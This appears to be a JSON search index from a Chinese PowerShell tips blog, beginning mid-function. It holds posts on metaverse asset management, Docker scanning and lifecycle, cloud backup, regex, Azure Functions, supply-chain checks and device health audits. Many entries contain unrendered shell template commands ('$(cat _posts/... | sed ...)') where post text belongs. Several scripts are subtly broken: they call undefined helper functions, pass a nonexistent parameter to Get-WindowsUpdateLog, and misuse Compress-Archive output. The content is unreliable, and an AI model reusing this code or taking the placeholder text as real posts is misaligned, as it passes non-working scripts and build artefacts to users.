[Parameter(Mandatory=$true)] [string]$AssetType, [ValidateSet('Create','Update')] [string]$Operation = 'Create' ) $assetReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' TotalAssets = 0 OperationLogs = @() PermissionChanges = @() } try { # 元数据模板配置 $metadataTemplate = @{ NFT = @{ Properties = @('Owner','CID','Royalties') } Avatar = @{ Properties = @('ModelID','Inventory','Permissions') } Land = @{ Properties = @('Coordinates','Terrain','BuildHeight') } } # 执行资产操作 switch ($Operation) { 'Create' { $newAsset = [PSCustomObject]@{ Type = $AssetType Metadata = $metadataTemplate[$AssetType] Created = Get-Date } $assetReport.OperationLogs += $newAsset } 'Update' { $updatedAsset = [PSCustomObject]@{ Type = $AssetType Modified = Get-Date PermissionUpdates = (Get-Random -Minimum 1 -Maximum 5) } $assetReport.PermissionChanges += $updatedAsset } } # 统计资产总量 $assetReport.TotalAssets = (Get-ChildItem &quot;HKLM:\\SOFTWARE\\MetaverseAssets\\$AssetType&quot; -Recurse).Count } catch { Write-Error &quot;资产管理操作失败: $_&quot; } # 生成XRSF格式报告 $assetReport | ConvertTo-Json | Out-File -Path &quot;$env:TEMP/MetaverseReport_$(Get-Date -Format yyyyMMdd).json&quot; return $assetReport} 核心功能： 多类型数字资产模板管理 元数据版本控制系统 权限变更追踪审计 XRSF格式交互报告 应用场景： 虚拟经济系统构建 NFT资产批量发行 元宇宙土地资源分配 跨平台资产迁移管理","link":"/2024/04/18/powershell-metaverse-assets/"},{"title":"","text":"$(cat _posts/2024-04-22-powershell-kubernetes-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/04/22/powershell-kubernetes-integration/"},{"title":"","text":"$(cat _posts/2024-04-19-powershell-financial-monitoring.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/04/19/powershell-financial-monitoring/"},{"title":"","text":"$(cat _posts/2024-04-23-powershell-container-orchestration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/04/23/powershell-container-orchestration/"},{"title":"PowerShell 技能连载 - 容器安全扫描","text":"在容器化环境中，安全扫描是确保部署安全的关键步骤。以下脚本实现Docker镜像漏洞扫描： 123456789101112131415161718192021222324252627282930313233343536373839404142434445function Invoke-ContainerScan { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$ImageName, [ValidateSet('Low','Medium','High','Critical')] [string]$SeverityLevel = 'High' ) $report = [PSCustomObject]@{ Vulnerabilities = @() TotalCount = 0 RiskRating = 'Unknown' } try { # 执行安全扫描 $result = docker scan $ImageName --severity $SeverityLevel --format json | ConvertFrom-Json # 解析扫描结果 $report.Vulnerabilities = $result.vulnerabilities | Select-Object @{ Name = 'CVEID'; Expression = {$_.vulnerabilityID} }, @{ Name = 'Severity'; Expression = {$_.severity} }, @{ Name = 'Component'; Expression = {$_.pkgName} } $report.TotalCount = $result.vulnerabilities.Count # 计算风险评级 $report.RiskRating = switch ($result.vulnerabilities.Count) { {$_ -gt 20} {'Critical'} {$_ -gt 10} {'High'} {$_ -gt 5} {'Medium'} default {'Low'} } } catch { Write-Error &quot;扫描失败: $_&quot; } return $report} 实现原理： 集成Docker Scan命令实现镜像安全扫描 通过JSON格式输出解析漏洞数据 根据漏洞数量和严重级别计算风险评级 支持按严重级别过滤扫描结果 使用示例： 1Invoke-ContainerScan -ImageName 'nginx:latest' -SeverityLevel 'Critical' 最佳实践： 集成到CI/CD流水线实现自动阻断 定期更新漏洞数据库 与镜像仓库集成实现预检扫描 生成HTML格式的详细报告 注意事项：• 需要安装Docker Desktop 4.8+版本• 扫描可能消耗较多系统资源• 建议配置扫描超时机制","link":"/2024/04/25/powershell-container-security/"},{"title":"PowerShell 技能连载 - 云存储自动化备份方案","text":"在混合云架构中，数据保护是业务连续性的关键。本文演示如何通过PowerShell实现本地数据到云端存储的自动化备份，支持Azure Blob和AWS S3两种主流云存储方案。 123456789101112131415161718192021222324252627282930313233343536373839function Start-CloudBackup { param( [string]$LocalPath, [ValidateSet('Azure','AWS')] [string]$CloudProvider, [string]$ContainerName ) try { # 压缩本地数据 $backupFile = &quot;$env:TEMP\\backup_$(Get-Date -Format yyyyMMdd).zip&quot; Compress-Archive -Path $LocalPath -DestinationPath $backupFile # 执行云上传 switch ($CloudProvider) { 'Azure' { az storage blob upload --account-name $env:AZURE_STORAGE_ACCOUNT \\ --container $ContainerName \\ --file $backupFile \\ --auth-mode key } 'AWS' { Write-S3Object -BucketName $ContainerName \\ -File $backupFile \\ -Region $env:AWS_REGION } } # 验证备份 $checksum = (Get-FileHash $backupFile).Hash Write-Host &quot;备份完成，校验码：$checksum&quot; } catch { Write-Error &quot;备份失败：$_&quot; } finally { Remove-Item $backupFile -ErrorAction SilentlyContinue }} 实现原理分析： 采用标准化ZIP格式进行数据压缩打包 通过云服务商CLI工具实现混合云上传 哈希校验机制确保备份数据完整性 临时文件自动清理保障存储空间 异常处理覆盖网络中断和权限问题 该脚本将备份操作从手动执行转为计划任务驱动，特别适合需要定期保护关键业务数据的金融和电商场景。","link":"/2024/04/24/powershell-cloud-backup-automation/"},{"title":"","text":"$(cat _posts/2024-04-26-powershell-pdf-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/04/26/powershell-pdf-processing/"},{"title":"PowerShell正则表达式入门精要","text":"基础匹配模式12345678# 邮箱验证正则$emailPattern = '^[\\w-\\.]+@([\\w-]+\\.)+[\\w-]{2,4}$''test@example.com' -match $emailPattern # 返回True# 提取电话号码$text = '联系电话：010-12345678 或 13800138000'$text -match '\\d{3,4}-\\d{7,8}'$matches[0] # 输出010-12345678 正则表达式元字符 字符 功能描述 示例 . 匹配任意字符 a.c → abc \\d 匹配数字 \\d{3} → 123 \\w 匹配字母数字下划线 \\w+ → abc123 ^ 匹配行首 ^Start $ 匹配行尾 end$ 替换操作示例1234567# 日期格式转换'2024-04-07' -replace '(\\d{4})-(\\d{2})-(\\d{2})','$3/$2/$1'# 输出07/04/2024# 清理多余空格'PowerShell 正则 教程' -replace '\\s+',' '# 输出PowerShell 正则 教程 性能优化建议 预编译常用正则表达式 避免贪婪匹配引发性能问题 使用非捕获组(?:)减少内存开销","link":"/2024/04/29/powershell-regex-basic/"},{"title":"PowerShell 技能连载 - Docker容器生命周期管理","text":"在容器化技术广泛应用的今天，Docker容器的日常管理成为运维工作的重要环节。本文将演示如何通过PowerShell实现容器生命周期的自动化管理，包括创建、启停和监控等操作。 1234567891011121314151617181920212223242526272829303132function Manage-DockerContainer { param( [ValidateSet('Create','Start','Stop','Remove')] [string]$Action, [string]$ImageName, [string]$ContainerName ) try { switch ($Action) { 'Create' { docker run -d --name $ContainerName $ImageName } 'Start' { docker start $ContainerName } 'Stop' { docker stop $ContainerName } 'Remove' { docker rm -f $ContainerName } } # 获取容器状态 $status = docker inspect -f '{{.State.Status}}' $ContainerName Write-Host &quot;$($Action)操作完成，当前状态：$status&quot; } catch { Write-Error &quot;$Action操作失败：$_&quot; }} 实现原理分析： 通过Docker命令行接口实现容器操作 参数验证机制确保操作类型合法性 支持创建/启动/停止/删除四大核心操作 操作完成后自动获取并返回容器实时状态 异常处理机制捕获常见容器操作错误 该脚本将容器管理操作封装为可重复使用的函数，特别适合需要批量管理多个容器实例的微服务架构场景。","link":"/2024/04/30/powershell-docker-automation/"},{"title":"","text":"$(cat _posts/2024-05-01-powershell-manufacturing-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/01/powershell-manufacturing-integration/"},{"title":"","text":"$(cat _posts/2024-05-02-powershell-variable-scopes.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/02/powershell-variable-scopes/"},{"title":"","text":"$(cat _posts/2024-05-03-powershell-zero-trust-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/03/powershell-zero-trust-management/"},{"title":"","text":"$(cat _posts/2024-05-06-powershell-cim-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/06/powershell-cim-management/"},{"title":"","text":"$(cat _posts/2024-05-07-powershell-error-handling-essentials.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段代码展示了PowerShell中的错误处理技术。错误处理是任何健壮脚本的关键部分，可以确保脚本在遇到异常情况时能够优雅地响应，而不是简单地失败。通过使用try/catch/finally块和错误变量，PowerShell提供了全面的错误管理能力。\\n/}pd}p’)","link":"/2024/05/07/powershell-error-handling-essentials/"},{"title":"","text":"$(cat _posts/2024-05-08-powershell-function-advanced.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码定义了一个PowerShell函数，用于封装特定的功能，使其可重用。函数是PowerShell脚本中组织代码的基本单元，可以接受参数、执行操作并返回结果。通过将相关代码组织到函数中，可以提高代码的可读性、可维护性和可重用性。\\n/}pd}p’)","link":"/2024/05/08/powershell-function-advanced/"},{"title":"PowerShell 技能连载 - Azure Functions自动化管理","text":"在无服务器架构日益普及的今天，Azure Functions作为事件驱动的计算服务广受欢迎。本文将演示如何通过PowerShell实现Functions的自动化部署与监控，帮助运维人员提升云端资源管理效率。 12345678910111213141516171819202122232425262728293031323334353637function Manage-AzureFunction { param( [ValidateSet('Create','Update','Remove')] [string]$Action, [string]$FunctionName, [string]$ResourceGroup ) try { # 身份验证检查 if (-not (Get-AzContext)) { Connect-AzAccount -UseDeviceAuthentication } switch ($Action) { 'Create' { New-AzFunctionApp -Name $FunctionName -ResourceGroupName $ResourceGroup ` -Runtime PowerShell -StorageAccount (Get-AzStorageAccount -ResourceGroupName $ResourceGroup).StorageAccountName ` -FunctionsVersion 4 -Location 'EastUS' } 'Update' { Publish-AzWebApp -ResourceGroupName $ResourceGroup -Name $FunctionName ` -ArchivePath (Compress-Archive -Path ./src -DestinationPath function.zip -Force) } 'Remove' { Remove-AzFunctionApp -Name $FunctionName -ResourceGroupName $ResourceGroup -Force } } # 获取运行状态 $status = Get-AzFunctionApp -Name $FunctionName -ResourceGroupName $ResourceGroup Write-Host &quot;操作成功：$($status.State)&quot; } catch { Write-Error &quot;操作失败：$_&quot; }} 实现原理分析： 通过Azure PowerShell模块实现与云端的认证交互 参数验证机制确保操作类型合法性 支持创建/更新/删除三大核心操作的生命周期管理 部署时自动压缩源代码为ZIP包进行上传 操作完成后实时获取并返回函数运行状态 该脚本将原本需要多次点击门户的操作简化为单条命令，特别适合需要批量管理多个函数应用的DevOps场景。","link":"/2024/05/09/powershell-azure-functions-automation/"},{"title":"PowerShell 技能连载 - 元宇宙集成","text":"在元宇宙领域，PowerShell可以帮助我们更好地管理虚拟环境、数字资产和用户交互。本文将介绍如何使用PowerShell构建一个元宇宙管理系统，包括虚拟环境管理、数字资产管理等功能。 虚拟环境管理首先，让我们创建一个用于管理虚拟环境的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293function Manage-VirtualEnvironment { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$EnvironmentID, [Parameter()] [string[]]$EnvironmentTypes, [Parameter()] [ValidateSet(&quot;Create&quot;, &quot;Update&quot;, &quot;Delete&quot;)] [string]$OperationMode = &quot;Create&quot;, [Parameter()] [hashtable]$EnvironmentConfig, [Parameter()] [string]$LogPath ) try { $manager = [PSCustomObject]@{ EnvironmentID = $EnvironmentID StartTime = Get-Date EnvironmentStatus = @{} Operations = @{} Issues = @() } # 获取环境配置 $config = Get-EnvironmentConfig -EnvironmentID $EnvironmentID # 管理虚拟环境 foreach ($type in $EnvironmentTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用环境配置 $typeConfig = Apply-EnvironmentConfig ` -Config $config ` -Type $type ` -Mode $OperationMode ` -Settings $EnvironmentConfig $status.Config = $typeConfig # 执行环境操作 $operations = Execute-EnvironmentOperations ` -Type $type ` -Config $typeConfig $status.Operations = $operations $manager.Operations[$type] = $operations # 检查环境问题 $issues = Check-EnvironmentIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新环境状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Normal&quot; } $manager.EnvironmentStatus[$type] = $status } # 记录环境日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;虚拟环境管理失败：$_&quot; return $null }} 数字资产管理接下来，创建一个用于管理数字资产的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Manage-DigitalAssets { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$AssetID, [Parameter()] [string[]]$AssetTypes, [Parameter()] [ValidateSet(&quot;Create&quot;, &quot;Update&quot;, &quot;Transfer&quot;)] [string]$OperationMode = &quot;Create&quot;, [Parameter()] [hashtable]$AssetConfig, [Parameter()] [string]$ReportPath ) try { $manager = [PSCustomObject]@{ AssetID = $AssetID StartTime = Get-Date AssetStatus = @{} Operations = @{} Issues = @() } # 获取资产配置 $config = Get-AssetConfig -AssetID $AssetID # 管理数字资产 foreach ($type in $AssetTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用资产配置 $typeConfig = Apply-AssetConfig ` -Config $config ` -Type $type ` -Mode $OperationMode ` -Settings $AssetConfig $status.Config = $typeConfig # 执行资产操作 $operations = Execute-AssetOperations ` -Type $type ` -Config $typeConfig $status.Operations = $operations $manager.Operations[$type] = $operations # 检查资产问题 $issues = Check-AssetIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新资产状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Normal&quot; } $manager.AssetStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-AssetReport ` -Manager $manager ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;数字资产管理失败：$_&quot; return $null }} 用户交互管理最后，创建一个用于管理用户交互的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Manage-UserInteraction { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$InteractionID, [Parameter()] [string[]]$InteractionTypes, [Parameter()] [ValidateSet(&quot;Track&quot;, &quot;Analyze&quot;, &quot;Report&quot;)] [string]$OperationMode = &quot;Track&quot;, [Parameter()] [hashtable]$InteractionConfig, [Parameter()] [string]$ReportPath ) try { $manager = [PSCustomObject]@{ InteractionID = $InteractionID StartTime = Get-Date InteractionStatus = @{} Operations = @{} Issues = @() } # 获取交互配置 $config = Get-InteractionConfig -InteractionID $InteractionID # 管理用户交互 foreach ($type in $InteractionTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用交互配置 $typeConfig = Apply-InteractionConfig ` -Config $config ` -Type $type ` -Mode $OperationMode ` -Settings $InteractionConfig $status.Config = $typeConfig # 执行交互操作 $operations = Execute-InteractionOperations ` -Type $type ` -Config $typeConfig $status.Operations = $operations $manager.Operations[$type] = $operations # 检查交互问题 $issues = Check-InteractionIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新交互状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Normal&quot; } $manager.InteractionStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-InteractionReport ` -Manager $manager ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;用户交互管理失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理元宇宙环境的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209# 管理虚拟环境$manager = Manage-VirtualEnvironment -EnvironmentID &quot;ENV001&quot; ` -EnvironmentTypes @(&quot;World&quot;, &quot;Space&quot;, &quot;Event&quot;) ` -OperationMode &quot;Create&quot; ` -EnvironmentConfig @{ &quot;World&quot; = @{ &quot;Settings&quot; = @{ &quot;World1&quot; = @{ &quot;Type&quot; = &quot;Open&quot; &quot;Size&quot; = &quot;100km²&quot; &quot;Theme&quot; = &quot;Fantasy&quot; } &quot;World2&quot; = @{ &quot;Type&quot; = &quot;Closed&quot; &quot;Size&quot; = &quot;50km²&quot; &quot;Theme&quot; = &quot;Sci-Fi&quot; } } &quot;Features&quot; = @{ &quot;Physics&quot; = $true &quot;Weather&quot; = $true &quot;Time&quot; = $true } } &quot;Space&quot; = @{ &quot;Settings&quot; = @{ &quot;Space1&quot; = @{ &quot;Type&quot; = &quot;Public&quot; &quot;Capacity&quot; = &quot;1000&quot; &quot;Access&quot; = &quot;Open&quot; } &quot;Space2&quot; = @{ &quot;Type&quot; = &quot;Private&quot; &quot;Capacity&quot; = &quot;100&quot; &quot;Access&quot; = &quot;Invite&quot; } } &quot;Features&quot; = @{ &quot;Chat&quot; = $true &quot;Voice&quot; = $true &quot;Video&quot; = $true } } &quot;Event&quot; = @{ &quot;Settings&quot; = @{ &quot;Event1&quot; = @{ &quot;Type&quot; = &quot;Concert&quot; &quot;Capacity&quot; = &quot;5000&quot; &quot;Duration&quot; = &quot;2h&quot; } &quot;Event2&quot; = @{ &quot;Type&quot; = &quot;Conference&quot; &quot;Capacity&quot; = &quot;1000&quot; &quot;Duration&quot; = &quot;4h&quot; } } &quot;Features&quot; = @{ &quot;Live&quot; = $true &quot;Recording&quot; = $true &quot;Interaction&quot; = $true } } } ` -LogPath &quot;C:\\Logs\\environment_management.json&quot;# 管理数字资产$manager = Manage-DigitalAssets -AssetID &quot;ASSET001&quot; ` -AssetTypes @(&quot;NFT&quot;, &quot;Token&quot;, &quot;Land&quot;) ` -OperationMode &quot;Create&quot; ` -AssetConfig @{ &quot;NFT&quot; = @{ &quot;Assets&quot; = @{ &quot;NFT1&quot; = @{ &quot;Type&quot; = &quot;Art&quot; &quot;Format&quot; = &quot;3D&quot; &quot;Rarity&quot; = &quot;Legendary&quot; } &quot;NFT2&quot; = @{ &quot;Type&quot; = &quot;Avatar&quot; &quot;Format&quot; = &quot;3D&quot; &quot;Rarity&quot; = &quot;Rare&quot; } } &quot;Features&quot; = @{ &quot;Transfer&quot; = $true &quot;Trade&quot; = $true &quot;Display&quot; = $true } } &quot;Token&quot; = @{ &quot;Assets&quot; = @{ &quot;Token1&quot; = @{ &quot;Type&quot; = &quot;Currency&quot; &quot;Supply&quot; = &quot;1000000&quot; &quot;Decimals&quot; = 18 } &quot;Token2&quot; = @{ &quot;Type&quot; = &quot;Reward&quot; &quot;Supply&quot; = &quot;100000&quot; &quot;Decimals&quot; = 18 } } &quot;Features&quot; = @{ &quot;Transfer&quot; = $true &quot;Stake&quot; = $true &quot;Reward&quot; = $true } } &quot;Land&quot; = @{ &quot;Assets&quot; = @{ &quot;Land1&quot; = @{ &quot;Type&quot; = &quot;Residential&quot; &quot;Size&quot; = &quot;1000m²&quot; &quot;Location&quot; = &quot;Prime&quot; } &quot;Land2&quot; = @{ &quot;Type&quot; = &quot;Commercial&quot; &quot;Size&quot; = &quot;5000m²&quot; &quot;Location&quot; = &quot;Premium&quot; } } &quot;Features&quot; = @{ &quot;Build&quot; = $true &quot;Rent&quot; = $true &quot;Develop&quot; = $true } } } ` -ReportPath &quot;C:\\Reports\\asset_management.json&quot;# 管理用户交互$manager = Manage-UserInteraction -InteractionID &quot;INTER001&quot; ` -InteractionTypes @(&quot;Social&quot;, &quot;Commerce&quot;, &quot;Game&quot;) ` -OperationMode &quot;Track&quot; ` -InteractionConfig @{ &quot;Social&quot; = @{ &quot;Features&quot; = @{ &quot;Chat&quot; = @{ &quot;Enabled&quot; = $true &quot;Type&quot; = &quot;Text&quot; &quot;Privacy&quot; = &quot;Public&quot; } &quot;Voice&quot; = @{ &quot;Enabled&quot; = $true &quot;Type&quot; = &quot;Spatial&quot; &quot;Privacy&quot; = &quot;Private&quot; } &quot;Video&quot; = @{ &quot;Enabled&quot; = $true &quot;Type&quot; = &quot;3D&quot; &quot;Privacy&quot; = &quot;Private&quot; } } &quot;Analytics&quot; = @{ &quot;Activity&quot; = $true &quot;Engagement&quot; = $true &quot;Behavior&quot; = $true } } &quot;Commerce&quot; = @{ &quot;Features&quot; = @{ &quot;Shop&quot; = @{ &quot;Enabled&quot; = $true &quot;Type&quot; = &quot;Virtual&quot; &quot;Payment&quot; = &quot;Crypto&quot; } &quot;Market&quot; = @{ &quot;Enabled&quot; = $true &quot;Type&quot; = &quot;P2P&quot; &quot;Payment&quot; = &quot;Crypto&quot; } &quot;Auction&quot; = @{ &quot;Enabled&quot; = $true &quot;Type&quot; = &quot;Dutch&quot; &quot;Payment&quot; = &quot;Crypto&quot; } } &quot;Analytics&quot; = @{ &quot;Sales&quot; = $true &quot;Trends&quot; = $true &quot;Behavior&quot; = $true } } &quot;Game&quot; = @{ &quot;Features&quot; = @{ &quot;Play&quot; = @{ &quot;Enabled&quot; = $true &quot;Type&quot; = &quot;MMO&quot; &quot;Mode&quot; = &quot;Multiplayer&quot; } &quot;Quest&quot; = @{ &quot;Enabled&quot; = $true &quot;Type&quot; = &quot;Dynamic&quot; &quot;Reward&quot; = &quot;Token&quot; } &quot;Battle&quot; = @{ &quot;Enabled&quot; = $true &quot;Type&quot; = &quot;PvP&quot; &quot;Mode&quot; = &quot;Ranked&quot; } } &quot;Analytics&quot; = @{ &quot;Performance&quot; = $true &quot;Achievement&quot; = $true &quot;Behavior&quot; = $true } } } ` -ReportPath &quot;C:\\Reports\\interaction_management.json&quot; 最佳实践 实施虚拟环境管理 管理数字资产 优化用户交互 保持详细的元宇宙记录 定期进行数据分析 实施安全控制 建立应急响应机制 保持系统文档更新","link":"/2024/05/10/powershell-metaverse-integration/"},{"title":"","text":"$(cat _posts/2024-05-13-powershell-security-audit.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/13/powershell-security-audit/"},{"title":"","text":"$(cat _posts/2024-05-14-powershell-active-directory-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/14/powershell-active-directory-management/"},{"title":"PowerShell 技能连载 - 软件供应链安全自动化审计","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function Invoke-SupplyChainScan { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$ScanPath, [ValidateSet('Critical','High','Medium','Low')] [string]$SeverityLevel = 'Critical' ) $report = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' ScannedComponents = @() SecurityFindings = @() } # 组件哈希校验与签名验证 Get-ChildItem $ScanPath -Recurse -Include *.dll,*.exe,*.psm1 | ForEach-Object { $fileHash = (Get-FileHash $_.FullName -Algorithm SHA256).Hash $signature = Get-AuthenticodeSignature $_.FullName $component = [PSCustomObject]@{ FileName = $_.Name FilePath = $_.FullName SHA256 = $fileHash IsSigned = $signature.Status -eq 'Valid' Publisher = $signature.SignerCertificate.Subject } $report.ScannedComponents += $component if (-not $component.IsSigned) { $report.SecurityFindings += [PSCustomObject]@{ Severity = 'High' Description = &quot;未签名的组件: $($_.Name)&quot; Recommendation = &quot;要求供应商提供数字签名版本或验证组件来源&quot; } } } # 依赖包漏洞扫描 $nugetPackages = Get-ChildItem $ScanPath -Recurse -Include packages.config $nugetPackages | ForEach-Object { [xml]$config = Get-Content $_.FullName $config.packages.package | ForEach-Object { $cveData = Invoke-RestMethod &quot;https://api.cvecheck.org/v1/search?id=$($_.id)&quot; if ($cveData.vulnerabilities | Where-Object { $_.severity -ge $SeverityLevel }) { $report.SecurityFindings += [PSCustomObject]@{ Severity = $SeverityLevel Description = &quot;存在漏洞的依赖包: $($_.id) v$($_.version)&quot; Recommendation = &quot;升级到最新安全版本 $($cveData.latestVersion)&quot; } } } } $report | Export-Csv -Path &quot;$ScanPath\\SupplyChainReport_$(Get-Date -Format yyyyMMdd).csv&quot; -NoTypeInformation return $report} 核心功能： 软件组件哈希指纹校验 数字签名自动验证 NuGet依赖包漏洞扫描 CVE数据库集成查询 典型应用场景： 开发环境第三方组件安全检查 CI/CD流水线安全卡点 供应商交付物合规验证 企业软件资产安全基线报告","link":"/2024/05/15/powershell-supplychain-security/"},{"title":"","text":"$(cat _posts/2024-05-16-powershell-energy-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/16/powershell-energy-integration/"},{"title":"PowerShell 技能连载 - 零信任架构设备健康检查","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function Invoke-DeviceHealthCheck { [CmdletBinding()] param( [ValidateSet('Basic','Full')] [string]$ScanLevel = 'Basic' ) $healthReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' DeviceID = (Get-CimInstance -ClassName Win32_ComputerSystem).Name Compliance = $true SecurityScore = 100 Findings = @() } # 基础检查项 $checks = @( { Get-CimInstance -ClassName Win32_BIOS | Select-Object Version,ReleaseDate }, { Get-WindowsUpdateLog -Last 7 | Where Status -ne 'Installed' }, { Get-NetFirewallProfile | Where Enabled -eq $false } ) if ($ScanLevel -eq 'Full') { $checks += @( { Get-Service -Name WinDefend | Where Status -ne 'Running' }, { Get-ChildItem 'C:\\Temp' -Recurse -File | Where {$_.LastWriteTime -gt (Get-Date).AddDays(-1)} }, { Get-LocalUser | Where PasswordNeverExpires -eq $true } ) } foreach ($check in $checks) { try { $result = &amp; $check if ($result) { $healthReport.Findings += [PSCustomObject]@{ CheckName = $check.ToString().Split('{')[1].Trim() Status = 'NonCompliant' Details = $result | ConvertTo-Json -Compress } $healthReport.SecurityScore -= 10 $healthReport.Compliance = $false } } catch { Write-Warning &quot;检查项执行失败: $_&quot; } } $healthReport | Export-Clixml -Path &quot;$env:TEMP\\DeviceHealthReport_$(Get-Date -Format yyyyMMdd).xml&quot; return $healthReport} 核心功能： 多层级设备健康扫描（基础/完整模式） 实时安全态势评分机制 自动化合规性验证 XML格式审计报告生成 典型应用场景： 企业设备入网前合规检查 零信任架构下的持续设备验证 远程办公终端安全审计 